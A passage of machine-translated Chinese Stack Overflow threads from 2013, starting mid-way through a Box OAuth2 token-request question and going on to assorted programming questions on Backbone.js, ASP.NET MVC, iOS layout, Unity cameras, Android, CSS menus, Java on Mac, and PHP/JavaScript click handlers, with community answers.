grant_type%3dauthorization_code%26code%3d3ikruv5elfdw3fOP55aMDSX7ybLqBFlA%26client_id%3d[subbed]%26client_secret%3d[subbed]%26redirect_uri%3dhttps%3a%2f%2fCloudBoxWP8 
```

返回

```
HTTP/1.1 400 Bad Request
Server: nginx
Date: Fri, 01 Mar 2013 07:46:03 GMT
Content-Type: application/json
Connection: keep-alive
Set-Cookie: box_visitor_id=51305cbb339de4.03221876; expires=Sat, 01-Mar-2014 07:46:03 GMT; path=/; domain=.box.com
Set-Cookie: country_code=US; expires=Tue, 30-Apr-2013 07:46:03 GMT; path=/
Cache-Control: no-store
Content-Length: 99

{"error":"invalid_request","error_description":"Invalid grant_type parameter or parameter missing"} 
```

无 URL 编码：

```
POST https://api.box.com/oauth2/token HTTP/1.1
Accept: */*
Content-Length: 190
Accept-Encoding: identity
User-Agent: NativeHost
Host: api.box.com
Connection: Keep-Alive
Cache-Control: no-cache

grant_type=authorization_code&code=2wgIzfqhvIgRtVIp2ZvqZ9X8R5u0QNaf&client_id=[subbed]&client_secret=[subbed]&redirect_uri=https://CloudBoxWP8 
```

返回：

```
HTTP/1.1 400 Bad Request
Server: nginx
Date: Fri, 01 Mar 2013 07:50:31 GMT
Content-Type: application/json
Connection: keep-alive
Set-Cookie: box_visitor_id=51305dc751d7f5.67064854; expires=Sat, 01-Mar-2014 07:50:31 GMT; path=/; domain=.box.com
Set-Cookie: country_code=US; expires=Tue, 30-Apr-2013 07:50:31 GMT; path=/
Cache-Control: no-store
Content-Length: 99

{"error":"invalid_request","error_description":"Invalid grant_type parameter or parameter missing"} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-05-24T17:07:46.683

它没有在 Box API 文档的任何地方列出，但检索访问令牌的请求需要标头`Content-Type: application/x-www-form-urlencoded`

我也被这部分卡住了一段时间，直到我在 StackOverflow 上找到了答案。我忘记了它的链接。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-28T21:25:12.817

请求/响应会有所帮助。看起来您正在对整个查询字符串进行 UrlEncoding，而不仅仅是对每个值进行编码。提交给我们的是：grant_type%3Dauthorization_code%26code%3Dxyz%26client_id%3Dxyz%26client_secret%3Dxyz%26redirect_uri%3Dxyz

而不是：grant_type=authorization_code&code=xyz&client_id=xyz&client_secret=xyz&redirect_uri=xyz

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-04T16:07:06.517

我认为`redirect_uri`在您的请求正文中包含 可能会使事情复杂化，特别是因为它看起来被设置为无效值（`https://CloudBoxWP8`）您可以通过将应用程序设置为处理自定义协议（`cloudboxwp8://`）并预先配置 Box 以重定向到当令牌被授予时。

1.  [为您的 WP8 应用注册自定义协议](http://msdn.microsoft.com/en-us/library/windowsphone/develop/jj206987%28v=vs.105%29.aspx#BKMK_URIassociations)。例如，`cloudboxwp8`。
2.  增强您的 WP8 应用程序以处理对该协议上某个端点的请求。例如，`cloudboxwp8://tokengranted`。在此处实现您的令牌处理逻辑。
3.  编辑您的 Box 应用程序并浏览到 OAuth2 参数部分（通过[管理 Box 应用程序](https://www.box.com/developers/services)=> 编辑应用程序）
4.  在该`redirect_uri`字段中，将值设置为步骤 2 中的自定义协议和端点。保存您的更改。
5.  `redirect_uri`从您的请求正文中删除 并再次尝试您的请求。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-08-31T09:47:26.473

在 Windows 手机 8.1 WinRT 中

```
Dictionary<string, string> contentList = new Dictionary<string, string>();

contentList.Add("code", code);
contentList.Add("client_id", client_id);
contentList.Add("client_secret", clientSecret);
contentList.Add("redirect_uri", redirectUri);
contentList.Add("grant_type", "authorization_code");

FormUrlEncodedContent content = new FormUrlEncodedContent(contentList);

var response = await client.PostAsync(baseURL, content);
YouTubeAutenticationResponse res =       JsonConvert.DeserializeObject<YouTubeAutenticationResponse>(await     response.Content.ReadAsStringAsync());

public class YouTubeAutenticationResponse
{
    [JsonProperty("access_token")]
    public string AccessToken { get; set; }
    [JsonProperty("token_type")]
    public string TokenType { get; set; }
    [JsonProperty("expires_in")]
    public string ExpiresIn { get; set; }
    [JsonProperty("refresh_token")]
    public string RefreshToken { get; set; }
} 
```

# backbone.js - 使用backbone.js 编写带有额外参数的保存函数

> ID：15111713
> 
> 赞同：2
> 
> 时间：2013-02-27T12:05:56.377
> 
> 标签：backbone.js, model

我在一个新的 Backbone.js 中。我需要在我的应用程序中发送一些带有保存功能的变量。例如： `myModel.save({variabl1,variabl2,..}, { success: function() {} });`

变量与 myModel 无关。但我不知道该怎么做。如果你知道怎么做，请告诉我！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T12:36:03.743

您可以在保存方法的选项中传递参数。

```
myModel.save(
    {variabl1,variabl2,..}, 
    { success: function() {}, 
      data: {param1: 'value1', param2: 'value2' }  
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T11:18:20.950

我找到了方法：

```
myModel.save( null, { 
      headers: {param1: 'value1', param2: 'value2' }, 
      success: function() {} 

}); 
```

也许任何人都会有用的代码。

# c# - 在 asp.net MVC 控制器上执行异步 OnAction

> ID：15111716
> 
> 赞同：1
> 
> 时间：2013-02-27T12:05:59.833
> 
> 标签：c#, asp.net-mvc, multithreading, asynchronous

我有一个任务需要在控制器处理完请求并且响应正在返回客户端的途中执行。为此，我已经覆盖了`OnActionExecuted()`控制器上的事件并在此方法中调用了任务。

由于任务可能需要一些时间才能运行并返回 void，所以我想异步调用它，以便覆盖的`OnActionExecuted()`方法可以立即返回，并且可以在任务执行时将响应发送到客户端。我试图用下面的代码来实现这个，使用`Task.Run()`（在.net 4.5中）

```
protected override void OnActionExecuted(ActionExecutedContext filterContext)
{
    Task.Run(() => WrapUp());
} 
```

但是，这不会产生预期的效果。当我单步执行代码时，它仍然同步执行——方法中的所有内容都在方法退出`WrapUp()`之前被调用。`OnActionExecuted()`当`WrapUp()`方法挂起时，客户端在收到响应之前等待任务完成。

我需要做什么才能使这项工作按预期进行？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T12:12:22.313

将`OnActionExecuted`立即返回，因为您在内部只是创建和启动任务。您观察到的行为不正常。如果您尝试以下操作会发生什么：

```
protected override void OnActionExecuted(ActionExecutedContext filterContext)
{
    Task.Run(() => Thread.Sleep(10000));
} 
```

客户端不会等待 10 秒才能得到结果，是吗？

# iphone - 重叠的 UITextView 边框

> ID：15111722
> 
> 赞同：0
> 
> 时间：2013-02-27T12:06:07.023
> 
> 标签：iphone, ios, uiview, uiinterfaceorientation

我需要为我的应用程序支持横向和纵向方向，并且我冒险使用单个 UIView。

当我第一次模拟应用程序时，它会毫无问题地显示结果。但是，当我将方向更改为横向时，就会出现问题。

我第一次纵向运行应用程序时： ![在此处输入图像描述](../Images/178a61aed8edea65c0865d2d4f5714e4.png)

当我将方向更改为横向时： ![在此处输入图像描述](../Images/40de469aa87c64066618072b4e5e8046.png) 注意左下角，靠近信息选项卡。

当我将方向改回纵向时： ![在此处输入图像描述](../Images/da29b0ec5e88283605ce660a9517dfb3.png) 它变得更糟。

我正在使用的代码，

```
- (void)updateLayoutForNewOrientation:(UIInterfaceOrientation)toInterfaceOrientation
{
    CGFloat height = CGRectGetHeight([[UIScreen mainScreen] bounds]);
    CGFloat width = CGRectGetWidth([[UIScreen mainScreen] bounds]);

    if (UIInterfaceOrientationIsPortrait(toInterfaceOrientation)) {
        NSLog(@"Portrait");
        [self iPhoneUserInterfacePortrait:width height:height];
    }

    else if (UIInterfaceOrientationIsLandscape(toInterfaceOrientation)) {
        NSLog(@"Landscape");
        [self iPhoneUserInterfaceLandscape:width height:height];
    }
}

- (void)iPhoneUserInterfacePortrait:(CGFloat)width height:(CGFloat)height
{
    UITextView *descriptionTextView = [[UITextView alloc] initWithFrame:CGRectMake(0.0, 0.0, width - 100.0, height - 300.0)];

    [self makeBorder:descriptionTextView];
    [self setInformation:descriptionTextView];
    [self.view addSubview:descriptionTextView];
}

- (void)iPhoneUserInterfaceLandscape:(CGFloat)width height:(CGFloat)height
{
    UITextView *descriptionTextView = [[UITextView alloc] initWithFrame:CGRectMake(0.0, 0.0, width + 230, height - 368.0)];

    [self makeBorder:descriptionTextView];
    [self setInformation:descriptionTextView];
    [self.view addSubview:descriptionTextView];
}

- (void)makeBorder:(UITextView *)descriptionTextView
{
    descriptionTextView.layer.borderWidth = 3.0;
    descriptionTextView.layer.cornerRadius = 15.0;
    descriptionTextView.layer.borderColor = [[UIColor grayColor] CGColor];

    [self.view addSubview:descriptionTextView];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:10:34.213

您正在添加多个视图，而您只需要一个视图。

```
[self.view addSubview:descriptionTextView]; 
```

要摆脱这一行，您可以将字段添加`descriptionTextView`到您的 ViewController 子类并更改该文本视图的框架，而无需从`self.view`. 此外，您应该尝试使用 AutoResizing 蒙版，看看是否可以在不实际手动更改帧的情况下获得所需的结果。你应该小心这些常量：在 3.5 和 4.0 英寸的模拟器设备上尝试你的应用程序。

# unity3d - 从四个不同角度渲染 3D 对象

> ID：15111725
> 
> 赞同：1
> 
> 时间：2013-02-27T12:06:15.393
> 
> 标签：unity3d, game-engine

我正在做一个项目，我必须在屏幕上同时渲染 3D 对象的 4 个不同侧面。输出应该有 4 个不同的相机输出来渲染 3d 对象的正面、左侧、右侧和背面。

我发现像 Unity 这样的游戏引擎可能有助于做这样的事情。但是，我刚刚开始使用 Unity，不知道该怎么做。

[这是](http://imageshack.us/photo/my-images/27/holographiccar.jpg/)一些示例的链接。这就是我希望输出的样子

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T14:25:05.573

首先，欢迎来到 Stackoverflow。你是对的，Unity 是一个出色的 IDE，可以实现你所描述的。

如[常见问题解答](https://stackoverflow.com/faq)和[此处](https://stackoverflow.com/questions/how-to-ask)所述，我将给您一个我认为适合您的问题的答案。我可以在大约 30 分钟内将代码发布到这里，这完全符合您的要求，但是我们通常会错过学习编程和在 StackOverflow 上发布的要点。我会告诉你如何开始这个项目，但是你必须自己尝试。如果您在尝试更多之后有任何问题，我们可以帮助您解决具体问题，前提是您之前研究过一些问题并向我们展示您尝试过的内容。

至于你的问题，这样做相对容易。`Camera`首先在场景中创建您的对象，然后在屏幕中拖动并放置四个不同的对象。使用相机`Normalized View Port Rect` （在屏幕坐标中指示此相机视图将在屏幕上绘制的位置的四个值（值 0-1）），然后您可以拆分视图以显示每个相机的提要。

这当然发生在脚本中。您可以[在此处](http://docs.unity3d.com/Documentation/Manual/Scripting.html)阅读有关 Unity 中的脚本的信息。即使您是编程专家，当您刚接触 Unity 时，该链接也值得一读。

祝你好运。

# c# - 如何：通用二进制最小堆比较成员对象

> ID：15111727
> 
> 赞同：0
> 
> 时间：2013-02-27T12:06:21.977
> 
> 标签：c#, generics, mono, binary-tree

我正在创建一个简单的二进制最小堆。我很清楚二进制堆是如何工作的，实现它们不是问题。但是，考虑到我想在我的树中存储我想要比较的成员的对象（而不是整数/浮点数/双精度/等），我在如何实现通用二进制堆（在这种情况下为最小堆）时遇到了麻烦为了使物体向上或向下起泡。

这样的事情有什么解决办法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:10:58.137

是的，您只需要将 T 的泛型类型限制为[`IComparable<T>`](http://msdn.microsoft.com/en-gb/library/4d7sx9hd.aspx).

例如：

```
public sealed class BinaryMinHeap<T> where T: IComparable<T>
{
    ... 
```

然后你在哪里比较你的类型 T 你做的元素：

```
if (element.CompareTo(otherThing) > 0)
    ... 
```

（CompareTo() 的返回值的符号告诉您元素的顺序。）

和所有的内置类型都实现了`int`，所以这种方法也适用于它们。`double``string``IComparable<T>`

或者，您可以传入一个[`Comparison<T>`](http://msdn.microsoft.com/en-us/library/tfakywbh%28v=vs.100%29.aspx)委托以在比较元素时使用。那么类型 T 就不必实现`IComparable<T>`.

有关使用 的示例`Comparison<T>`，请参阅[`Array.Sort<T>()`](http://msdn.microsoft.com/en-us/library/cxt053xf%28v=vs.100%29.aspx)。

# android - 扩展自定义活动时出现 NullPointerException

> ID：15111731
> 
> 赞同：0
> 
> 时间：2013-02-27T12:06:33.090
> 
> 标签：android

有一个扩展自定义 MainActivity 的 DashBoardActivity，但在尝试从 DashBoardActivity 访问某些视图时出现 NullPointerException。知道为什么会发生这种情况或这里没有看到什么吗？谢谢

主要活动：

```
@Override
    public void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        setContentView(R.layout.dashboard_layout);

        linearlayout = (LinearLayout)findViewById(R.id.footer_container_id);
        actionlayout = (LinearLayout)findViewById(R.id.actionbar_container_id);

        mainboard = (ImageView)findViewById(R.id.image_dashboard_id);
        dashboard = (ImageView)findViewById(R.id.image_comparison_id);
        graph = (ImageView)findViewById(R.id.image_graph_id);
        contact = (ImageView)findViewById(R.id.image_contact_id);

        actionbar = getSupportActionBar();
        actionbarView = getLayoutInflater().inflate(R.layout.actionbar, null);
        actionbar.setCustomView(actionbarView, new ActionBar.LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT));
        actionbar.setDisplayOptions(ActionBar.DISPLAY_SHOW_CUSTOM); 

        }

public void setSelectedDashBoard(){  
   mainboard.setSelected(true);
} 
```

仪表板活动：

```
public class DashBoardActivity extends MainActivity implements OnClickListener {

    @Override
    public void onCreate(Bundle savedInstanceState){

        super.onCreate(savedInstanceState);
        int orientation = getResources().getConfiguration().orientation;

        sessionmanager = new SessionManager(this);
        prefs = getSharedPreferences(PREFS_NAME,0);
        String cached_username = prefs.getString(USERNAME, "");

        mainboard.setSelected(true);  // NullPointerException here. 
```

仪表板_layout.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" >

    <LinearLayout
        android:orientation="horizontal"
        android:id="@+id/footer_container_id" 
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true"> 

    <include layout="@layout/footer"></include>   
    </LinearLayout>

 <FrameLayout
        android:id="@+id/dashboard_fragment_container_id"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_above="@id/footer_container_id"
        android:layout_alignParentTop="true">
    </FrameLayout>

</RelativeLayout> 
```

footer.xml 的一部分：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/layout_footer_id" android:layout_width="fill_parent"
    android:layout_height="wrap_content" android:layout_alignParentBottom="true"
    android:background="#292929" android:orientation="horizontal">

    <LinearLayout android:id="@+id/ytd_container_id"
        android:layout_width="wrap_content" android:layout_height="wrap_content"
        android:layout_weight="1" android:orientation="vertical">

        <ImageView android:id="@+id/image_dashboard_id"
            android:layout_width="wrap_content" android:layout_height="wrap_content"
            android:layout_gravity="center" android:src="@drawable/footer_icons_ytd" />

        <TextView android:id="@+id/ytd_text_id" android:layout_width="match_parent"
            android:layout_height="wrap_content" android:layout_gravity="center"
            android:layout_marginBottom="5dp" android:layout_marginLeft="5dp"
            android:clickable="false" android:paddingLeft="10dp" android:text="Year to Date"
            android:textColor="#FFFFFF" android:textSize="10sp">

        </TextView>
        "
    </LinearLayout> 
```

**更新** 如果我使用方法 setSelectedDashBoard() 代替，我刚刚从 MainActivity 类添加，我没有得到 NullPointerException。不明白。。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:08:22.450

```
 dashboard = (ImageView)findViewById(R.id.image_comparison_id); 
```

仪表板为空的唯一原因是`R.id.image_comparison_id`不属于`R.layout.dashboard_layout`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:21:12.037

它是字符 " ，除非是拼写错误。

```
 </TextView>
    **"**
 </LinearLayout> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T14:46:21.110

它看起来像是子类成员变量遮蔽的典型错误。您应该检查是否在 DashBoardActivity 中重新声明了变量仪表板。子类只是用未初始化的本地变量替换继承的变量。

# iphone - 我的 iAd 不会像我的布局那样改变方向

> ID：15111732
> 
> 赞同：2
> 
> 时间：2013-02-27T12:06:33.997
> 
> 标签：iphone, ipad, user-interface, iad

在创建共享实例的帮助下添加 iAd。在运行应用程序`UI`对齐更改。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:28:23.580

您可以使用

```
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation 
```

# android - 在哪里可以找到 Google Play 服务归属文本？

> ID：15111733
> 
> 赞同：8
> 
> 时间：2013-02-27T12:06:34.997
> 
> 标签：android, google-maps, google-play-services

[谷歌地图文档](https://developers.google.com/maps/documentation/android/intro#attribution_requirements)说，必须将 Google Play 服务归属文本作为“法律声明”的一部分。可通过调用 获取归属文本`GooglePlayServicesUtil.getOpenSourceSoftwareLicenseInfo`。但是 GooglePlayServicesUtil 直到 Android 2.2 才可用。我的应用程序是为 2.0 设计的，那么这个文本是什么，我从哪里得到它？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-02-27T12:38:00.540

这是什么

```
Log.d("DEBUG", GooglePlayServicesUtil.getOpenSourceSoftwareLicenseInfo(this)); 
```

揭示（2013 年 2 月 - 这可能同时发生了变化！见第一条评论）：

> 本产品包括 Android 开源项目版权所有 (c) 2005-2008，根据 Apache 许可证 2.0 版（“许可证”）许可的 Android 开源项目的软件；除非遵守许可，否则您不得使用此文件。除非适用法律要求或书面同意，否则根据许可分发的软件将按“原样”分发，没有任何明示或暗示的保证或条件。有关许可下的特定语言管理权限和限制，请参阅许可。Apache 许可证 2.0 版，2004 年 1 月 [http://www.apache.org/licenses/](http://www.apache.org/licenses/)

然后是[Apache 许可证版本 2.0](http://www.apache.org/licenses/LICENSE-2.0)。

**编辑 2016 年 1 月 3 日**：`GooglePlayServicesUtil.getOpenSourceSoftwareLicenseInfo(Context)`现已**弃用**。

改为使用`GoogleApiAvailability.getInstance().getOpenSourceSoftwareLicenseInfo(Context);`。

**编辑 17 年 10 月 31 日** 正如 donfuxx 所说，它不再需要在应用程序中显示。[谷歌文档](https://developers.google.com/android/reference/com/google/android/gms/common/GooglePlayServicesUtil#getOpenSourceSoftwareLicenseInfo(android.content.Context))

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T12:34:35.207

> 我在哪里可以找到归属信息？
> 
> 您可以在
> 产品内容底部显示的行中找到归属以及版权声明，例如“Map data ©2012 Google, Sanborn”。请注意，归因的确切文本会根据地理位置和内容类型而变化。出处文字必须对普通观众或读者清晰易读

取自：[http ://www.google.com/permissions/geoguidelines/attr-guide.html](http://www.google.com/permissions/geoguidelines/attr-guide.html)

[这](http://www.google.com/permissions/geoguidelines.html)是一个包含更多一般信息的页面，以及一个权限工具，如果您的用例更复杂，您可以使用。

[此图像](http://3.bp.blogspot.com/-V1hIqOXDfi4/UNxfrxJNmyI/AAAAAAAAGrM/j59JMYUvNMk/s400/screen_MapsAPIv2_Legal+Notices.png)准确地描绘了您正在寻找的文本。

# javascript - 是否可以在与 Visual Studio 不同的 IDE 中开发 Win8 应用程序？

> ID：15111739
> 
> 赞同：0
> 
> 时间：2013-02-27T12:06:52.687
> 
> 标签：javascript, html, visual-studio, windows-8

正如标题所提到的，我想开发一个`html`//应用程序，但在开发 html 时`css`，我不喜欢express 或标准版本。`js``Windows8``Visual Studio`

因此，我的问题是所有语言都是开源的，例如是否有其他 IDE 的捆绑包或教程，`Aptana Studio`这样您就不需要在 VS 中开发？

或者如果微软没有任何暗示将来会发布这样的东西？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T13:08:02.790

您可以使用任何您喜欢的编辑器来编写应用程序。我个人编写的大部分代码都使用**VIM 。**

但是，为了构建适用于 Win8 的应用程序，您必须使用 .Net 平台附带的编译器等工具。您可以从控制台使用该工具，因此您将避免与 Visual Studio 交互

# html - 带有子选项的 CSS 水平菜单

> ID：15111742
> 
> 赞同：-1
> 
> 时间：2013-02-27T12:07:01.273
> 
> 标签：html, css

我正在尝试在主菜单项下添加子菜单，但没有这样做。我已经添加`display:none`了隐藏子菜单，`display:block`以显示鼠标何时在主菜单上等到 CSS 中的一些标签，但它们都不起作用。也许我添加到错误的地方。

我已经清除了我所有的错误代码，而不是处理混乱的代码，而是给你一个清晰的代码来修改它。

除非鼠标悬停在其父菜单上，否则子菜单不应可见。子菜单也应出现在其父菜单的正下方。

提前致谢

**CSS**

```
<style>
.menu{
    width: 100%;
    background-color: #666666; }
.menu ul{
    margin: 0; padding: 0;
    float: left;}

.menu ul li{
    display: inline;
    position: relative;}

.menu ul li a{
    float: left; text-decoration: none;
    color: white; 
    padding: 10.5px 11px;
    background-color: #333; }

.menu ul li a:hover, .menu ul li .current{
    color: #fff;
    background-color:#0b75b2;}

</style> 
```

**HTML**

```
<div class="menu">
    <ul>
        <li><a href="#">HOME</a>
            <ul>
                <li><a href="#">Home</a></li>
                <li><a href="#">Home short</a></li>
                <li><a href="#">Home very long</a></li>
            </ul>
        </li>
        <li><a href="#">ADMINISTRATOR</a>
            <ul>
                <li><a href="#">Admin</a></li>
                <li><a href="#">Admin short</a></li>
            </ul>
        </li>
        <li><a href="#">STAFF</a>
            <ul>
                <li><a href="#">staff</a></li>
            </ul>
        </li>
        <li><a href="#">LOGOUT</a></li>
    </ul>
    <br style="clear:left"/>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:11:55.803

改成`.menu ul li ul{ position: absolute;}`

如果我正确理解您的问题，现在可以正常工作。

所以..

```
.menu ul li ul{
position:absolute;
margin-top:40px;
width:150px;}

.menu ul li ul li{
display:block;} 
```

隐藏直到悬停，`.menu ul li ul{ display:none; } .menu ul li:hover ul{display:block; }`

# java - Java 7 将在 mac 上以 32 位运行

> ID：15111743
> 
> 赞同：8
> 
> 时间：2013-02-27T12:07:01.970
> 
> 标签：java, desktop-application, java-7

我正在构建一个桌面 Java 应用程序。它使用第三方框架进行一些低级工作（它使用 C 语言，我使用过 JNA）。

在我的 Windows 机器上，当我这样做时，`Native.loadLibrary("EDSDK.dll", EdSdkLibrary.class, options);`它运行良好。在Mac上，当我尝试这样做`Native.loadLibrary("EDSDK.framework", EdSdkLibrary.class, options);`时会 `UnsatisfiedLinkError`说：`mach-o, but wrong architecture`

我的 java 7 版本是 64 位，框架是基于 32 位的。在包含 Java6 的不同 Mac 上，当我以 32 位模式运行 Java 时，应用程序运行良好。这确认抛出的异常是因为 32 位不兼容，我只需要使用 32 位（这很明显）。

这是令人恼火的部分——在 Java 7 中，`-d32`选项不起作用，Oracle 不再提供 32 位的 Java 7。如何以 32 位运行我的 Java 7，以便我可以使用第三方框架？打开JDK？或者使用 Java 6 并在 32 位模式下使用它。但 Oracle 不再为 Mac 提供 Java 6。

还有其他选择吗？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:22:34.723

您可以下载[Apple Java 6 JDK](http://support.apple.com/kb/DL1572)，其中包含 32 位 JVM。但我怀疑 Java 6 未来的安全更新会有很多，所以你最好掌握一个 64 位版本的本机框架并将其与 Oracle Java 7 一起使用。

# visual-studio-2010 - visual studio 2010 加载和构建速度非常慢

> ID：15111745
> 
> 赞同：-1
> 
> 时间：2013-02-27T12:07:03.450
> 
> 标签：visual-studio-2010, visual-studio

我已经在我的系统上安装了 Visual Studio 2012，之后我的系统非常慢。即使是 Visual Studio 2010（之前安装的）也非常非常慢。打开需要15分钟。5分钟搭建一个简单的hello word程序。我最近只安装了 Vs 2012 和 Windows 7 SP1。

请告诉我如何加快 VS 2010（而不是 2012）的速度。它还添加了 Telerik 控件。如有必要，我准备将其删除。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:08:44.600

有什么告诉我它可能只是一台缓慢的电脑？

编辑：为了不只是留下一个巨魔帖子，我最近得到了 VS 2012，它根本没有影响我的加载/构建或编译时间

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-07-30T23:38:21.193

如果 Vs 2012 试试这个：删除 App_Data 文件夹中所有“未使用”的 MS Access 或其他数据文件 - 包括子文件夹中的任何文件。如果您在 App_Data 或任何子文件夹中有旧版本，那么即使您的网站不使用它们，Visual Studio 也必须打开所有这些版本。就我而言，打开网站需要 2 到 3 分钟，而关闭则需要更长的时间。我有 50 个左右的备份和测试数据库，我保存在不同的文件夹中，只是一个存档。我只是将它们移动到我网站的另一个文件夹中。哇 - Visual Studio 现在在几秒钟内打开。

# php - 我希望用户看到当前登录到我网站的其他所有人

> ID：15111747
> 
> 赞同：-2
> 
> 时间：2013-02-27T12:07:17.873
> 
> 标签：php, javascript, mysql

我正在使用 Javascript、PHP 和 mySQL 编写一个相当复杂的项目管理系统。所有用户都存储在一个 mySQL 表中，当他们登录时，我在 PHP 中设置了一个会话变量并记录了他们上次登录的时间。我这样做只是为了让人们无法通过按 F5 来增加访问次数。

我希望所有登录的用户都能看到当前登录到该站点的所有其他用户的列表。

我能看到解决这个问题的唯一方法是触发一个 PHP 脚本（比如每 10 秒），它会做两件事。将当前用户的当前时间记录到 mySQL 表中，然后查看所有其他用户的最后记录时间。上次登录时间少于当前时间前 20 秒的任何人都将显示为已登录。

我知道如何在 Javascript、Ajax 等中使用计时器来完成所有这些工作，但在我看来，这似乎是一种不太优雅的方式来完成我需要的事情。

我的问题：

这是实现我想要的最佳方式吗

为每个用户每 10 秒发送一次 ajax 调用和更新 mySQL 数据库是一种好的编程习惯吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:14:11.533

我建议您创建一个表“loggedinusers”，其中包含有关当前登录用户的信息。现在，如果您想刷新页面上的列表，您肯定会使用 javascipt，而这必须通过 Ajax 查询和 db 计时器来完成。

另一种解决方案是在页面上有一个 php 模块，当您导航到每个页面时，该模块将查询数据库。因此，当用户浏览您的网站时，您将获得有关新用户登录的信息。我想这很合理。

小表（只有几千个条目）不会影响性能。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T12:14:45.330

嗯，这取决于架构。

如果此信息仅对您和一些额外的用户可用 - 您可以每 1-2 分钟 grep Varnish / Apache / Nginx 日志（您可以添加一些额外的日志以显示 cookie 等）并将其输出到静态html 页面 - 提供凭据后可用。

这样做的方式有点不同 - 但不会影响平台的性能。

# php - 如何通过单击 php 中的链接来显示消息？

> ID：15111751
> 
> 赞同：0
> 
> 时间：2013-02-27T12:07:37.880
> 
> 标签：php, javascript, html, function, fatal-error

如何通过单击主题（主题是链接）来显示消息。这些是从数据库中检索数据的行

```
echo "<td width='180px' align='left'>"."<a href='#' onclick='loadmessage()'>".$row1['subject']."</a>"."</td>";?>
<script language="javascript" type="text/javascript">
    function loadmessage()
    {
        <?php 
        echo "hi";
        echo "<td align='left'>"."<textarea name='msg_content' cols='120' rows='2' readonly>".$row1['msg']."</textarea>"."</td>";?>
    }                   
</script>
 <?php 
```

此代码显示“致命错误：无法在第 132 行的 F:\wamp\www\sample\inbox.php 中重新声明 loadmessage()（之前在 F:\wamp\www\sample\inbox.php:132 中声明）”..谢谢你...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T12:10:02.327

哦，你真的需要了解客户端和服务器端编程之间的区别，你不能通过 PHP 调用 JavaScript

而是使用这个

```
<script>
function loadmessage() {
   alert('blahblah');
}
</script> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T12:09:52.353

PHP 是服务器端的，你不能点击一个 php 函数，你应该使用 Javascript 或 jQuery。试试这个：

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-27T12:11:48.550

php代码

```
echo "<td width='180px' align='left'>"."<a href='#' onclick='loadmessage()'>".$row1['subject']."</a>"."</td>"; 
```

// Javascript代码

```
<script>
    function loadmessage() {
     alert('hi')
    } 
</script> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-27T12:12:11.850

制作函数如下，放入myutils.inc.php中，使用require_once("myutils.inc.php"); 到任何你想使用这个功能的地方。

并将其称为 loadMessage($row1['msg']);

```
function loadmessage($message)
{
   echo "hi";
   echo "<td align='left'>"."<textarea name='msg_content' cols='120' rows='2' readonly>".$message."</textarea>"."</td>";
} 
```

这样，您可以解决致命错误。然而，@Mr. Alien 是对的，如果您想在即时点击时显示此消息，您必须为此使用 javascript。

将您的 html 添加到代码中，但将其内容保留为空。（事实上，如果您使用的是表格，这是必须的；因为不添加必要的元素会破坏表格。像这样向这个 td 添加一个 id：

```
<td id="<?php echo 'rowid_'.$row1['id'];?>" ....>
<a href="javascript:showMessage(<?php echo $row1['msg'];?>,<?php echo 'rowid_'.$row1['id'];?>">click me</a></td>

  <script language="javascript">
function showMessage(msg,field){
document.getElementById(field).InnerHTML=msg;
}
    </script> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-27T12:29:47.367

试试这个。。

## 1\. 简单的消息提醒

**php代码**

`echo "<a onclick=\"return alert('hello');\">helloo</a>";`

## 2并在消息框中调用变量的值..

php代码

`$d = "Hello how r u";`// 使用赋值变量。

`echo "<a onclick=\"return alert('$d');\">helloo</a>";`//调用alert框中变量的值

希望它对你充分利用....

# jquery - 将函数添加到可变数量的链接 onclick 事件

> ID：15111752
> 
> 赞同：0
> 
> 时间：2013-02-27T12:07:39.723
> 
> 标签：jquery, html, image, frontend

我有一点 JQuery 和 javascrip 来用较小缩略图的 src 更改大图像的 src 属性。缩略图的数量会有所不同，具体取决于上传的图像。

我在下面的代码在单击缩略图时有效，但是要为每个缩略图创建 onclick 事件，我必须遍历列表中的每张照片并写出“$('#thumb_n').click(function(). .." 对于每个缩略图。

请问有没有更简单的方法来做到这一点？

```
<script>
